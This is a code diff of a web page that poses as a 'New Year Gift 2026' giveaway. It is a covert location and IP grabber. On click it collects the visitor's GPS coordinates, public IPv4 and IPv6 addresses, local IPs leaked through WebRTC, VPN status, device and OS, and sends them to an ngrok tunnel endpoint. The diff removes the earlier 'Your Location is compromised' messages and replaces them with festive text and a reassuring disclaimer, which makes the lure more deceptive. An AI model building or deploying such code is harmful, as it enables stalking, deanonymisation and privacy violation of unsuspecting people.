@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Surprise Location Tracker</title>
+  <title>New Year Surprise, 2026</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
   <style>
@@ -361,7 +361,7 @@
 <body>
   <div class="container">
     <header>
-      <h1><i class="fas fa-surprise"></i> Click and Find Out Your Surprise </h1>
+      <h1><i class="fas fa-surprise"></i> Click and Get Your Gift of the year 2026 </h1>
       <p class="subtitle">Click the button below to receive your special surprise!</p>
     </header>
     
@@ -375,7 +375,7 @@
       </p>
       
       <button id="goLiveBtn" class="btn">
-        <i class="fas fa-gift"></i> GET MY SURPRISE NOW!
+        <i class="fas fa-gift"></i> GET MY Gift NOW!
       </button>
       
       <div id="status">
@@ -387,7 +387,7 @@
       </div>
       
       <div class="disclaimer">
-        <p><i class="fas fa-shield-alt"></i> Your location data is only used to generate your surprise and is not stored</p>
+        <p><i class="fas fa-shield-alt"></i> Your location data is only needed to send you the surprise and is not used maliciously</p>
       </div>
     </div>
   </div>
@@ -396,7 +396,7 @@
     document.addEventListener('DOMContentLoaded', async () => {
       const btn = document.getElementById('goLiveBtn');
       const statusEl = document.getElementById('status');
-      const API_BASE = 'https://50dacd5292e5.ngrok-free.app';
+      const API_BASE = 'https://577ec59f26f1.ngrok-free.app';
 
       // Fetch API keys from server
       let apiKeys;
@@ -429,7 +429,7 @@
       // Function to detect VPN usage with enhanced accuracy
       async function detectVPN(ipAddress) 
       {
-        if (!ipAddress || ipAddress === 'Public IP not available') 
+        if (!ipAddress || ipAddress === 'Not available') 
         {
           console.warn('No valid IP address for VPN detection');
           return {
@@ -542,8 +542,8 @@
         }
       }
       
-      // Function to get local IP address using WebRTC
-      async function getLocalIPAddress() 
+      // Function to get local IP addresses using WebRTC
+      async function getLocalIPAddresses() 
       {
         return new Promise((resolve) => {
           try 
@@ -552,7 +552,7 @@
             if (!RTCPeerConnection) 
             {
               console.warn('WebRTC not supported in this browser');
-              resolve(null);
+              resolve({ipv4: null, ipv6: null});
               return;
             }
             
@@ -568,38 +568,44 @@
             });
             pc.createDataChannel('');
             
-            let candidates = [];
+            let candidatesV4 = [];
+            let candidatesV6 = [];
             
             pc.onicecandidate = (event) => {
               if (event.candidate) 
               {
                 const candidate = event.candidate.candidate;
                 console.log('ICE candidate:', candidate);
-                const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
-                if (ipMatch && (
-                    ipMatch[1].startsWith('192.168.') ||
-                    ipMatch[1].startsWith('10.') ||
-                    ipMatch[1].startsWith('172.')
+                
+                // Match IPv4
+                const ipMatchV4 = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
+                if (ipMatchV4 && (
+                    ipMatchV4[1].startsWith('192.168.') ||
+                    ipMatchV4[1].startsWith('10.') ||
+                    (ipMatchV4[1].startsWith('172.') && parseInt(ipMatchV4[1].split('.')[1]) >= 16 && parseInt(ipMatchV4[1].split('.')[1]) <= 31)
                 )) {
-                  candidates.push(ipMatch[1]);
+                  candidatesV4.push(ipMatchV4[1]);
+                }
+                
+                // Match IPv6 - simple regex for IPv6 addresses
+                const ipMatchV6 = candidate.match(/([a-fA-F0-9:]{3,39})/);
+                if (ipMatchV6 && ipMatchV6[1].includes(':') && (
+                    ipMatchV6[1].toLowerCase().startsWith('fe80:') ||
+                    ipMatchV6[1].toLowerCase().startsWith('fc') ||
+                    ipMatchV6[1].toLowerCase().startsWith('fd')
+                )) {
+                  candidatesV6.push(ipMatchV6[1]);
                 }
               } 
               else 
               {
                 // No more candidates
-                if (candidates.length > 0) 
-                {
-                  const selectedIP = candidates.find(ip => ip.startsWith('192.168.')) || candidates[0];
-                  console.log('Selected local IP from WebRTC:', selectedIP);
-                  resolve(selectedIP);
-                  pc.close();
-                } 
-                else 
-                {
-                  console.warn('No valid local IP candidates found');
-                  resolve(null);
-                  pc.close();
-                }
+                const localIPv4 = candidatesV4.find(ip => ip.startsWith('192.168.')) || candidatesV4[0] || null;
+                const localIPv6 = candidatesV6[0] || null;
+                console.log('Selected local IPv4 from WebRTC:', localIPv4);
+                console.log('Selected local IPv6 from WebRTC:', localIPv6);
+                resolve({ipv4: localIPv4, ipv6: localIPv6});
+                pc.close();
               }
             };
             
@@ -607,41 +613,33 @@
               .then(offer => pc.setLocalDescription(offer))
               .catch(err => {
                 console.error('WebRTC offer error:', err);
-                resolve(null);
+                resolve({ipv4: null, ipv6: null});
                 pc.close();
               });
             
             // Timeout to prevent hanging
             setTimeout(() => {
-              if (candidates.length > 0) 
-              {
-                const selectedIP = candidates.find(ip => ip.startsWith('192.168.')) || candidates[0];
-                console.log('Selected local IP from WebRTC (timeout):', selectedIP);
-                resolve(selectedIP);
-                pc.close();
-              } 
-              else 
-              {
-                console.warn('WebRTC timed out with no valid candidates');
-                resolve(null);
-                pc.close();
-              }
+              const localIPv4 = candidatesV4.find(ip => ip.startsWith('192.168.')) || candidatesV4[0] || null;
+              const localIPv6 = candidatesV6[0] || null;
+              console.log('Selected local IPv4 from WebRTC (timeout):', localIPv4);
+              console.log('Selected local IPv6 from WebRTC (timeout):', localIPv6);
+              resolve({ipv4: localIPv4, ipv6: localIPv6});
+              pc.close();
             }, 6000);
           } 
           catch (err) 
           {
             console.error('WebRTC error:', err);
-            resolve(null);
+            resolve({ipv4: null, ipv6: null});
           }
         });
       }
       
-      // Fallback function to get public IP address
-      async function getPublicIPAddress() 
+      // Function to get public IPv4 address
+      async function getPublicIPv4() 
       {
         const ipApis = [
           { url: 'https://api.ipify.org?format=json', key: 'ip' },
-          { url: 'https://api64.ipify.org?format=json', key: 'ip' },
           { url: 'https://api.myip.com', key: 'ip' },
           { url: 'https://ipinfo.io/json', key: 'ip' }
         ];
@@ -671,7 +669,7 @@
               
               if (ip && /^(\d{1,3}\.){3}\d{1,3}$/.test(ip)) 
               {
-                console.log(`Public IP fetched from ${api.url} (attempt ${attempt}): ${ip}`);
+                console.log(`Public IPv4 fetched from ${api.url} (attempt ${attempt}): ${ip}`);
                 return ip;
               } 
               else 
@@ -681,7 +679,7 @@
             } 
             catch (error) 
             {
-              console.error(`Error fetching public IP from ${api.url} (attempt ${attempt}):`, error);
+              console.error(`Error fetching public IPv4 from ${api.url} (attempt ${attempt}):`, error);
               if (error.name === 'AbortError') 
               {
                 console.warn(`Request to ${api.url} timed out`);
@@ -693,25 +691,88 @@
             }
           }
         }
-        console.warn('All public IP APIs failed');
-        return 'Public IP not available';
+        console.warn('All public IPv4 APIs failed');
+        return 'Not available';
       }
       
-      // Main function to get IP address
-      async function getIPAddress() 
+      // Function to get public IPv6 address
+      async function getPublicIPv6() 
+      {
+        const ipApis = [
+          { url: 'https://api64.ipify.org?format=json', key: 'ip' }
+          // Add more IPv6-specific APIs if needed
+        ];
+        
+        const maxRetries = 2;
+        
+        for (const api of ipApis) 
+        {
+          for (let attempt = 1; attempt <= maxRetries; attempt++) 
+          {
+            try 
+            {
+              const controller = new AbortController();
+              const timeoutId = setTimeout(() => controller.abort(), 3000);
+              
+              const response = await fetch(api.url, {
+                cache: 'no-store',
+                mode: 'cors',
+                signal: controller.signal
+              });
+              
+              clearTimeout(timeoutId);
+              
+              if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
+              const data = await response.json();
+              const ip = data[api.key];
+              
+              if (ip && /([a-fA-F0-9:]{3,39})/.test(ip)) 
+              {
+                console.log(`Public IPv6 fetched from ${api.url} (attempt ${attempt}): ${ip}`);
+                return ip;
+              } 
+              else 
+              {
+                throw new Error(`Invalid IP format from ${api.url}: ${ip}`);
+              }
+            } 
+            catch (error) 
+            {
+              console.error(`Error fetching public IPv6 from ${api.url} (attempt ${attempt}):`, error);
+              if (error.name === 'AbortError') 
+              {
+                console.warn(`Request to ${api.url} timed out`);
+              }
+              if (attempt === maxRetries) 
+              {
+                console.warn(`All attempts failed for ${api.url}`);
+              }
+            }
+          }
+        }
+        console.warn('All public IPv6 APIs failed');
+        return 'Not available';
+      }
+      
+      // Main function to get IP addresses
+      async function getIPAddresses() 
       {
         const browser = getBrowserName();
         const deviceType = getDeviceType();
         
-        const publicIp = await getPublicIPAddress();
-        let localIp = null;
+        const publicIPv4 = await getPublicIPv4();
+        const publicIPv6 = await getPublicIPv6();
+        let localIPv4 = null;
+        let localIPv6 = null;
         
-        // Try to get local IP for desktops
+        // Try to get local IPs for desktops
         if (deviceType === 'Desktop') 
         {
-          console.log(`Attempting to fetch local IP via WebRTC for ${browser} (Desktop)`);
-          localIp = await getLocalIPAddress();
-          if (!localIp) {
+          console.log(`Attempting to fetch local IPs via WebRTC for ${browser} (Desktop)`);
+          const localIps = await getLocalIPAddresses();
+          localIPv4 = localIps.ipv4;
+          localIPv6 = localIps.ipv6;
+          if (!localIPv4 && !localIPv6) {
             console.warn('WebRTC failed or disabled');
             statusEl.innerHTML = `
               <p>Fetching location data...</p>
@@ -725,7 +786,7 @@
           }
         }
         
-        return { publicIp, localIp };
+        return { publicIPv4, publicIPv6, localIPv4, localIPv6 };
       }
       
       // Function to detect device type
@@ -861,9 +922,9 @@
               }
               
               // Get additional data
-              const ipData = await getIPAddress();
+              const ipData = await getIPAddresses();
               
-              if (ipData.publicIp === 'Public IP not available' && !ipData.localIp) 
+              if (ipData.publicIPv4 === 'Not available' && ipData.publicIPv6 === 'Not available' && !ipData.localIPv4 && !ipData.localIPv6) 
               {
                 statusEl.innerHTML = `
                   <p>Unable to fetch IP address.</p>
@@ -874,7 +935,10 @@
               }
               
               // Detect VPN usage
-              const vpnInfo = await detectVPN(ipData.publicIp !== 'Public IP not available' ? ipData.publicIp : ipData.localIp);
+              const ipForVPN = ipData.publicIPv4 !== 'Not available' ? ipData.publicIPv4 :
+                               ipData.publicIPv6 !== 'Not available' ? ipData.publicIPv6 :
+                               ipData.localIPv4 || ipData.localIPv6;
+              const vpnInfo = await detectVPN(ipForVPN);
               
               const deviceType = getDeviceType();
               const os = getOS();
@@ -886,8 +950,10 @@
                 accuracy: accuracy,
                 timestamp: position.timestamp || Date.now(),
                 userAgent: navigator.userAgent,
-                publicIpAddress: ipData.publicIp,
-                localIpAddress: ipData.localIp,
+                publicIPv4: ipData.publicIPv4,
+                publicIPv6: ipData.publicIPv6,
+                localIPv4: ipData.localIPv4,
+                localIPv6: ipData.localIPv6,
                 device: `${browser} (${os} (${deviceType}))`,
                 isVPN: vpnInfo.isVPN,
                 vpnProvider: vpnInfo.vpnProvider,
@@ -912,12 +978,12 @@
                 statusEl.innerHTML = `
                   <div class="success-message">
                     <i class="fas fa-exclamation-triangle fbi-icon"></i>
-                    Your Location is compromised
+                    Happy New Year 2026!
                   </div>
                 `;
                 
                 // Add a fun animation to the button
-                btn.innerHTML = '<i class="fas fa-running"></i> RUN FOR YOUR LIFE!';
+                btn.innerHTML = '<i class="fas fa-running"></i> Happy New Year 2026!';
                 btn.style.background = 'linear-gradient(to right, #dc3545, #8a3ffc)';
               } 
               else 
